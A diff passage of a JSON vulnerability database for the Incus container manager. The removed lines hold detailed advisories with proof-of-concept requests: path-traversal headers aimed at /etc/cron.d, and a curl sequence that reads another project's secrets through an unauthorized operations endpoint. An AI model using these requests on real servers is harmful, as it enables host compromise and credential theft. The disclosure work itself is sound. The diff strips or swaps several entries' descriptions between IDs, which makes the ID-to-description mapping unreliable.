filepath.Join(VarPath('images'), fp)` (:358) \u2192 `dest, _ := os.Create(destName)` (:393) executes before `fp = info.Fingerprint` (:416). Root daemon creates/truncates `/var/lib/incus/images/../../../../etc/cron.d/x`. `GetPrivateImageFile(fp, secret, request)` (:452) streams attacker bytes. 6. Impact: arbitrary-file truncate on any root-writable path; malicious `source.server` \u2192 arbitrary-content write \u2192 host RCE. ## Bypass Evidence `git show 46d6ef23` confirms the fix gates `validate.IsSHA256(fp)` behind `protocol == 'direct'` only. `grep -n` confirms `args.Secret == ''` at :135 gating the reassignment at :160, and `os.Create(destName)` at :393 preceding the reassignment at :416. Incomplete-fix bypass \u2014 affected range is the CVE-2026-48769 fix version onward through HEAD. ## Affected Versions `<= 7.2.0` (fix commit 46d6ef23 IS contained in v7.2.0, so the bypass affects the released version; vulnerable code verified present on HEAD 60d85b3e). ## Suggested Fix Hoist `validate.IsSHA256(fp)` to run for ALL protocols before `filepath.Join`/`os.Create`, and re-validate after any `fp = info.Fingerprint` reassignment. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -2240,8 +2240,8 @@
             },
             "CVE-2026-81495": {
                 "cve_id": "CVE-2026-81495",
-                "title": "Arbitrary file write on host via path traversal in custom volume import",
-                "description": "## Summary `POST /1.0/storage-pools/<pool>/volumes` with an `application/octet-stream` body (custom-volume ISO or backup import) uses an attacker-controlled name as an on-disk path segment without validation. A project user with the `can_create_storage_volumes` entitlement can supply `X-Incus-name: ../../../../<target>` (ISO) or an `index.yaml name: ../../../../<target>` (backup), causing the root Incus daemon to create directories, remove directory trees (`os.RemoveAll`), and (backup vector) unpack attacker content outside the storage pool. The `validate.IsAPIName` guard exists only on the JSON create branch and is never reached on the import branches. ## Root Cause In `storagePoolVolumesPost` (`cmd/incusd/storage_volumes.go:828-833`), octet-stream requests dispatch to `createStoragePoolVolumeFromISO(..., r.Header.Get('X-Incus-name'))` (`:830`) or `createStoragePoolVolumeFromBackup(...)` (`:833`) BEFORE the `validate.IsAPIName(req.Name)` at `:845` (which is only on the JSON branch). `createStoragePoolVolumeFromISO` (`:2697`) checks only `volName == ''` (`:2701`). The name flows to `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` -> `project.StorageVolume(projectName, volName)` -> `GetVolume(...).MountPath()` -> `dir.CreateVolume` `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`. `VolumeDBCreate`/`validateVolume` validate config keys only, not the name (verified - no `ValidName`/`IsAPIName`/`filepath` check in either). ## Impact Root-owned arbitrary directory creation and directory-tree removal (`os.RemoveAll`) at an attacker-chosen path (integrity/DoS). The backup import vector additionally unpacks tarball rootfs bytes, giving arbitrary-content file write as root -> host RCE. ## Proof of Concept ISO: `curl -X POST --data-binary @x.iso -H 'Content-Type: application/octet-stream' -H 'X-Incus-type: iso' -H 'X-Incus-name: ../../../../etc/cron.d/pwn' https://incus/1.0/storage-pools/default/volumes` (as a user with `can_create_storage_volumes`). ## Attack Chain 1. Entry: `POST /1.0/storage-pools/<pool>/volumes`, `Content-Type: application/octet-stream`, `X-Incus-type: iso`, `X-Incus-name: ../../../../etc/cron.d/x` -> `createStoragePoolVolumeFromISO` (`storage_volumes.go:830`). Guard: `allowPermission(project, can_create_storage_volumes)`. 2. Check: `if volName == ''` (`:2701`) - rejects only empty. `validate.IsAPIName(req.Name)` (`:845`) is on the JSON branch, not reached. Bypass proof: `volName` passes with any value including the traversal string. 3. Sink: `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` (`backend.go`) -> `project.StorageVolume(proj, volName)` -> `GetVolume(...).MountPath()` -> `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`, as root. `VolumeDBCreate`->`validateVolume` validates config keys only (verified). 4. Impact: root arbitrary dir create + directory-tree removal at attacker path; backup vector adds arbitrary-content write (RCE). ## Bypass Evidence `validate.IsAPIName` present but on the wrong branch (`:845`, JSON only); import branches (`:830`/`:833`) bypass it; downstream validation is config-only. `filepath.Join` collapse verified (same as the instance backup-import path). Forced `.iso` suffix constrains the final filename but still permits arbitrary-directory creation/removal via `..`. ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/storage_volumes.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `validate.IsAPIName(volName, false)` to the `X-Incus-name` header and to `bInfo.Name`/each volume-snapshot name at handler entry, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "open",
                 "events": [
@@ -2266,19 +2266,6 @@
             },
             "CVE-2026-81497": {
                 "cve_id": "CVE-2026-81497",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
-                "severity": "HIGH",
-                "status": "open",
-                "events": [
-                    {
-                        "introduced": "6.15-2.fc43",
-                        "identifier": "fc43"
-                    }
-                ]
-            },
-            "CVE-2026-81498": {
-                "cve_id": "CVE-2026-81498",
                 "title": "security update",
                 "description": "security update",
                 "severity": "HIGH",
@@ -2290,10 +2277,23 @@
                     }
                 ]
             },
+            "CVE-2026-81498": {
+                "cve_id": "CVE-2026-81498",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "6.15-2.fc43",
+                        "identifier": "fc43"
+                    }
+                ]
+            },
             "CVE-2026-81499": {
                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -2331,8 +2331,8 @@
             },
             "GHSA-443p-7392-h4v2": {
                 "cve_id": "GHSA-443p-7392-h4v2",
-                "title": "Restricted project can use pull mode migration through clustered refresh",
-                "description": "### Summary Restricted projects aren't allowed to use pull mode migration, as that has the server connect to an arbitrary remote URL chosen by the user. That rule is enforced by the instance creation check, but on clustered servers a migration request with `refresh` set for an instance that already exists locally takes a short-circuit straight into the migration sink and never runs that check. ### Impact A user with instance creation rights in a restricted project on a clustered server can have the server open an outbound TLS websocket connection to a URL of their choice, trusting a certificate they supply. This can be used to probe services reachable from the server. The refresh only synchronizes storage for an instance the user already owns, so no configuration bypass results from it. Standalone servers are not affected. ### Details The pull mode restriction is now enforced at the start of the refresh short-circuit, before the request is forwarded to another member or the migration sink is set up. ### Workarounds Don't grant instance creation in restricted projects on clustered servers to users who shouldn't be able to initiate outbound connections from the server.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -2344,19 +2344,6 @@
             },
             "GHSA-579w-c4rw-c8q3": {
                 "cve_id": "GHSA-579w-c4rw-c8q3",
-                "title": "Arbitrary file write on host via symlink in migration stream",
-                "description": "### Summary When receiving an instance or custom storage volume through migration (copy, move, refresh, push or pull), Incus hands the incoming data stream to `rsync`, or to `btrfs receive` for optimized transfers between btrfs pools. Both tools replay the stream on the host using regular path-based system calls and follow symlinks in the paths they write to. A malicious migration source can plant a symlink in the transferred volume, such as `rootfs` pointing at `/`, and have later entries in the same stream (or in the following snapshot or main volume stream) written through it. The symlink check added in Incus 7.3 runs after the transfer, so it doesn't prevent those writes. ### Impact Any client allowed to create an instance or custom volume in a project, or any server a target is told to copy or move from, can write attacker-controlled files to arbitrary paths on the target host as root, leading to full host compromise. For virtual machines the same technique can replace the `root.img` block file with a symlink before the block stream is written through it. All storage drivers receiving through `rsync` are affected, as is the optimized btrfs path. Optimized ZFS transfers are not affected as `zfs receive` never resolves host paths. Releases before 7.3.0 are additionally affected by a `rootfs` symlink surviving the transfer, which the file API then follows when chrooting into the container, allowing host files to be read as well as written. ### Details `rsync` writes each received entry to `<volume>/<path>` and, when the sender marks the parent directories as not transferred, resolves that path through whatever already exists on the receiving side, including a symlink created earlier in the transfer. `btrfs receive` behaves the same way as it applies `mkfile`, `write`, `mkdir` and `rename` commands with plain `creat()`, `open()`, `mkdir()` and `rename()` calls on paths built from the received subvolume. Neither verifies the stream against the real filesystem it was supposed to describe, so a crafted stream isn't constrained to what a genuine sender would produce. ### Workarounds Only allow trusted clients to create instances and custom volumes, and only migrate from trusted servers.",
-                "severity": "CRITICAL",
-                "status": "open",
-                "events": [
-                    {
-                        "introduced": "6.15-2.fc43",
-                        "identifier": "fc43"
-                    }
-                ]
-            },
-            "GHSA-hpjh-q53p-f27r": {
-                "cve_id": "GHSA-hpjh-q53p-f27r",
                 "title": "Title Not Available",
                 "description": "Description Not Available",
                 "severity": "CRITICAL",
@@ -2368,10 +2355,23 @@
                     }
                 ]
             },
+            "GHSA-hpjh-q53p-f27r": {
+                "cve_id": "GHSA-hpjh-q53p-f27r",
+                "title": "Arbitrary file write on host via path traversal in instance backup dependent volumes",
+                "description": "### Summary Importing an instance backup validates the instance name and snapshot names, but not the names of the dependent custom volumes listed in the backup's `index.yaml`. Those names are used verbatim as path segments when creating the volume on the target storage pool, so a `../` chain escapes the storage pool directory. ### Impact Any client allowed to create instances in a project can have the Incus daemon create root-owned directories, populated with attacker-controlled content, at arbitrary paths on the host, leading to full host compromise. The backup also names the project each dependent volume is created in, so the same request could create custom volumes in projects the caller has no access to. ### Details The fixes for CVE-2026-81495 and CVE-2026-81496 added name validation to the direct custom volume and instance backup import handlers. The dependent volume path nested inside an instance backup reaches the same volume creation code without going through either check. The name flows through `filepath.Join`, which collapses `../`, into `os.Mkdir` and the subsequent unpacking of the volume data. The attached-device gate can be satisfied by splitting the traversal string across the device's `pool` and `source` fields, as only the pool of the volume entry is resolved against a real storage pool. ### Workarounds Only allow trusted clients to create instances.",
+                "severity": "CRITICAL",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "6.15-2.fc43",
+                        "identifier": "fc43"
+                    }
+                ]
+            },
             "GHSA-jh4v-j34r-2mgh": {
                 "cve_id": "GHSA-jh4v-j34r-2mgh",
-                "title": "Project restriction bypass for custom volume copy with omitted source type",
-                "description": "### Summary Creating a custom storage volume with a `source` volume but no `source.type` is handled as a copy, but the source volume access check only applies when `source.type` is explicitly set to `copy`. A request that omits the type goes straight to the copy code path with a caller-controlled `source.project`. ### Impact Any client allowed to create custom volumes in a project can copy any custom volume from any other project on the server, including its snapshots and configuration, and read its contents, defeating project isolation. ### Details The `POST /1.0/storage-pools/{pool}/volumes/custom` endpoint only checks `can_create_storage_volumes` on the target project. The `can_view` check on the source volume added for CVE-2026-55621 lives in the `copy` arm of the source type switch, while the empty type arm calls the same copy helper without it. The official client always sets `source.type` to `copy`, so the empty form is only reachable through a crafted request.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -2383,8 +2383,8 @@
             },
             "GHSA-mfwv-x733-9446": {
                 "cve_id": "GHSA-mfwv-x733-9446",
-                "title": "Authorization bypass lets a restricted client read any operation in another project",
-                "description": "### Summary **Broken Authorization (CWE-862, Missing Authorization) on `GET /1.0/operations/{uuid}`.** The handler performs no authorization of any kind. Any authenticated client \u2014 including a TLS client certificate restricted to a single project \u2014 can read the full contents of any in-flight operation in any other project, including the command line, the environment variables and the websocket secrets the operation carries. `operationGet` is registered under `allowAuthenticated`, which your own code documents as deferring the real decision to the handler. The handler never makes one. ### Affected | Line | Range | Verified | |---|---|---| | Feature | `>= v0.2.0`, through `v7.4.0` | runtime, 7.4.0 from your apt repository | | LTS 6.0 | `v6.0.0` \u2013 `v6.0.6`, `stable-6.0` HEAD | runtime, 6.0.6 from your apt repository | | 7.0 | `v7.0.0`, `v7.0.1`, `stable-7.0` HEAD | source | | main | `dd19d9938` | source | The check has never existed. `operationGet` is 53 lines with zero authorizer calls at every tag from `v6.0.0` to `v7.4.0` and on all three branch heads. `v0.2.0` is the first release containing `613f937dc`, which is where operations authorization was introduced \u2014 so it is the first release in which Incus claims to authorize operations and does not authorize this one. One question on the range rather than an assertion: `doc/support.md` still describes 6.x as the feature line and refers to a future 7.0 LTS, while `stable-7.0` already carries point releases. Please confirm whether 7.0 is a supported line before the advisory range is published. ### Contrast, on one URL, one certificate, one instant A client certificate restricted to project `attacker`. A container `victim-box` in project `victim`. An admin starts an `exec` in `victim` carrying a marker in its environment. Then, as the restricted certificate: ``` --- attacker GET /1.0/operations/7a8fca8a-ff78-49a1-af51-fd73cf56aee1 -> 200 --- attacker GET .../wait?timeout=1 -> 200 --- attacker DELETE /1.0/operations/7a8fca8a-ff78-49a1-af51-fd73cf56aee1 -> 403 --- DELETE error body: {'error_code':403,'error':'User does not have permission for project \\'victim\\''} --- contents returned by the GET that was allowed, after the DELETE was denied: {'instances':['/1.0/instances/victim-box?project=victim']} {'DB_PASSWORD':'s3cr3t-victim-value','HOME':'/root','LANG':'C.UTF-8','USER':'root','PATH':'...'} {'0':'c5c793028efb9e0691423dfcd2a36e6dc18031b1408211ed8aa80308a7aef2a1', '1':'e557d78cd9a22790759e6997f1fdcdb9a5f22c41d811e588a3d96ea9021fffd7', '2':'edf04a0ae7d90ed45e31b322d9be311dfaef2683e5be6676bc07bab34c0caf34', 'control':'afa5bb2ed82f416c563d6f8881a4f5a01c3d66ad14ca3b5ce3f7c90e50c4d85b'} ``` `DELETE` refuses by project. `GET` on the same URL, from the same certificate, in the same second, hands over the victim's command line, environment and websocket secrets. ### Root cause `cmd/incusd/operations.go` registers three actions under `allowAuthenticated`: ```go 33: Delete: APIEndpointAction{Handler: operationDelete, AccessHandler: allowAuthenticated}, 34: Get: APIEndpointAction{Handler: operationGet, AccessHandler: allowAuthenticated}, 40: Get: APIEndpointAction{Handler: operationsGet, AccessHandler: allowAuthenticated}, ``` `cmd/incusd/daemon.go:275` states the contract: > `allowAuthenticated` is an AccessHandler which allows only authenticated requests. This should be used in conjunction with **further access control within the handler** (e.g. to filter resources the user is able to view/edit). Two of the three do that. `operationDelete` resolves the project from `op.Project()`, reads `op.Permission()`, builds an `auth.NewObject` per resource and calls `s.Authorizer.CheckPermission` (`operations.go:280-306`). `operationsGet` takes a `GetPermissionChecker` for `auth.EntitlementCanViewOperations` and filters every local and remote operation through it (`operations.go:538`, `:556`, `:584`). `operationGet` (`operations.go:181`) resolves the operation out of the global UUID-keyed map and renders it: ```go op, err := operations.OperationGetInternal(id) if err == nil { _, body, err = op.Render() if err != nil { return response.SmartError(err) } return response.SyncResponse(true, body) } ``` No `op.Project()`, no `op.Permission()`, no authorizer call, no read of `?project=`. The map is global, so the UUID alone selects the object. This is not a regression. `git log -S` puts it at the commit that introduced operations authorization: `613f937dc`, 2023-10-25, *'lxd: Update authorization for operations'* \u2014 a single-file, 34-line diff with four hunks. One hunk adds the check to `operationDelete`; three add the checker and its two filter sites to `operationsGet`. `operationGet` sits 77 lines above the `operationDelete` hunk **in that same diff** and is not touched. The list and the destructive verb were authorized; the read was walked past. ### Impact A tenant holding a restricted certificate \u2014 the mechanism Incus ships specifically to confine a client to its own projects \u2014 reads, from any other project on the server: - the full command line of any running `exec`, including anything passed as an argument; - the complete environment of that command, which is where deployment tooling puts database passwords, API tokens and cloud credentials; - the `fds` secrets for the operation's websockets, and the operation's resource URLs, which name instances and volumes in the other project. **Escalation to full server admin, demonstrated.** `incus config trust add` creates a `Running` operation whose metadata *is* the enrolment token. Reading that operation yields the token; the token enrols a fresh, unrestricted client certificate. From the restricted certificate we read such an operation, reassembled the token, enrolled a new certificate, and then read the victim's instance (HTTP 200) and listed every project on the server. We are **not** pricing that chain into the score below, because it needs a trust-token operation to be pending at the moment of the read, and that is operator timing rather than code. It is reported because it bounds what the primitive is worth, not because we are claiming it. **Limitation, stated plainly.** The attacker must know the operation's UUID and cannot get it from Incus. `uuid.New()` (`internal/server/operations/operations.go:138`) is `crypto/rand`-backed UUIDv4, 122 bits. We verified that a restricted certificate sees nothing through any enumeration path: `/1.0/operations?project=attacker`, `?all-projects=true` and `?project=victim` all return empty, and the victim's instance is correctly refused with 403. The UUID must come from outside \u2014 an operator's shell history or CI log, the `Location` header of an async response passing through a proxy or APM trace, `incus monitor` output pasted into a ticket, a former project membership, or a co-tenant on a shared automation account. No victim interaction is required after that. This is the same gating you accepted in CVE-2026-81501, whose text reads: *'the 64-hex fingerprint is not returned by GET / list to a caller without CanView. The attacker must obtain it out of band (logs, backups, a former project membership, a predictable custom image, etc.). No victim interaction is required after that.'* ### Suggested fix Give `operationGet` the check `operationDelete` already performs. The finished handler, with the existing body unchanged below it: ```go func operationGet(d *Daemon, r *http.Request) response.Response { s := d.State() id, err := pathVar(r, 'id') if err != nil { return response.SmartError(err) } var body *api.Operation // First check if the query is for a local operation from this node op, err := operations.OperationGetInternal(id) if err == nil { projectName := op.Project() if projectName == '' { projectName = api.ProjectDefaultName } err = s.Authorizer.CheckPermission(r.Context(), r, auth.ObjectProject(projectName), auth.EntitlementCanViewOperations) if err != nil { return response.SmartError(err) } _, body, err = op.Render() if err != nil { return response.SmartError(err) } return response.SyncResponse(true, body) } ``` `CanViewOperations` is the entitlement `operationsGet` already uses for exactly this question, so the read path and the list path end up answering it the same way. Using `op.Permission()` as `operationDelete` does would also work and would be stricter; `CanViewOperations` is suggested because it matches the verb. The cluster-forwarding branch below it inherits the fix for free: the remote member runs `operationGet` too and will apply the same check to the forwarded identity. `operationWaitGet` (`operations.go:46`) is registered `AllowUntrusted: true` and returns the same rendered object on completion. It needs the same treatment or the fix is bypassable by waiting instead of getting. We have not tested that path against a fix and are flagging it rather than asserting it. ### Dedup We could find no published advisory of yours covering operations. The fourteen published between 2026-07-30 and 2026-08-27 are image import, backup import, volume import, cross-project instance copy, migration config override, network address sets, idmap isolation, nvidia capabilities, VM template paths, image symlinks and fingerprints, and a CLI traversal. If this duplicates something already in your queue, please say so and close it \u2014 we would rather know than have you carry two. ### PoC Full sequence, reproducible on a clean install. Run as the server admin except where marked. ```sh # --- setup, as admin ------------------------------------------------------- incus project create victim incus project create attacker incus launch images:debian/12 victim-box --project victim # a client certificate restricted to project 'attacker' incus config trust add --name attacker --restricted --projects attacker # enrol that token from the client, then confirm the restriction: incus query /1.0/certificates/<fingerprint> # { 'name': 'attacker', 'restricted': true, 'projects': [ 'attacker' ] } # --- controls: the restriction works --------------------------------------- # as the attacker certificate curl --cert attacker.crt --key attacker.key -k \\ 'https://SERVER:8443/1.0/instances/victim-box?project=victim' # 403 User does not have permission for project 'victim' for q in 'project=attacker' 'all-projects=true' 'project=victim'; do curl --cert attacker.crt --key attacker.key -k \\ 'https://SERVER:8443/1.0/operations?$q' done # {} {} {} the operation is invisible through every listing curl -k 'https://SERVER:8443/1.0/operations/$OPID' # no client cert # 403 # --- the finding ----------------------------------------------------------- # as admin, start a command in the victim project carrying a marker incus exec victim-box --project victim --env DB_PASSWORD=s3cr3t-victim-value -- sleep 600 & OPID=$(incus operation list --project victim --format csv | head -1 | cut -d, -f1) # as the attacker certificate, same URL, two verbs curl --cert attacker.crt --key attacker.key -k \\ -X DELETE 'https://SERVER:8443/1.0/operations/$OPID' # 403 User does not have permission for project 'victim' curl --cert attacker.crt --key attacker.key -k \\ 'https://SERVER:8443/1.0/operations/$OPID' # 200, and the body contains: # resources.instances -> /1.0/instances/victim-box?project=victim # metadata.environment.DB_PASSWORD -> s3cr3t-victim-value # metadata.fds -> 0, 1, 2, control ``` Verified identically on `7.4.0` and on `6.0.6`, both installed from your apt repository. Both lab containers were destroyed after the run. ### Severity `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N` \u2014 **6.3 Medium**. This is set to **parity with your own scoring of CVE-2026-81501**, which carries the identical vector, rather than argued upward. Metric by metric: - **AV:N** \u2014 the HTTPS API, reachable from wherever the client is. - **AC:H** \u2014 the 122-bit UUID must be obtained out of band. This is the metric doing the work, and it is the same one you applied to the out-of-band fingerprint in CVE-2026-81501. - **PR:L** \u2014 a valid, enrolled client certificate. Not unauthenticated: `allowAuthenticated` refuses an untrusted client on this URL, and we checked. - **UI:N** \u2014 no victim interaction once the UUID is held. - **S:C** \u2014 the vulnerable component is the API's authorization layer; the impacted component is another project, which is the isolation boundary Incus sells. - **C:H / I:N / A:N** \u2014 the endpoint is read-only. Secrets of arbitrary value are returned. If you prefer to price the demonstrated trust-token chain, the vector becomes `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` = **8.5 High**. We are not proposing it, for the reason given under Impact, but it is the honest ceiling and the decision is yours.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "UNKNOWN",
                 "status": "open",
                 "events": [
@@ -2396,8 +2396,8 @@
             },
             "GHSA-mmj7-8rgf-mx2h": {
                 "cve_id": "GHSA-mmj7-8rgf-mx2h",
-                "title": "Read of other bucket objects via unsigned header on presigned S3 upload URL",
-                "description": "### Summary The in-process S3 server used for storage buckets on local storage pools verifies SigV4 signatures over the headers listed by the client in `X-Amz-SignedHeaders`, but never checks that every `x-amz-*` header present on the request is in that list. The SigV2 presigned path doesn't include those headers in the string to sign at all. A request can therefore carry unsigned `x-amz-*` headers that change how it is handled, which AWS S3 refuses. ### Impact Anyone holding a presigned upload URL for a single object, without any bucket credentials, can add an unsigned `X-Amz-Copy-Source` header and have the server copy any other object in the same bucket onto the granted key, with the copy performed under the signer's credentials. If the holder can also read the target key, for instance through a matching presigned download URL, this discloses the contents of arbitrary objects in the bucket. The response also leaks the ETag of the source object. All storage pool drivers using the built-in S3 server are affected. Ceph radosgw buckets are not, and the bucket listener (`core.storage_buckets_address`) is disabled by default. ### Details The canonical request only iterates over the client-supplied signed header list, so headers outside that list are never seen by the signature check. The object handler routes any PUT carrying `X-Amz-Copy-Source` to the copy path based on the header alone, so a write grant becomes a read within the bucket. The same gap exists on the `Authorization` header path, and the SigV2 presigned path omits the `CanonicalizedAmzHeaders` section entirely. ### Workarounds Don't hand out presigned URLs for buckets that also hold sensitive objects, or keep the bucket listener disabled.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
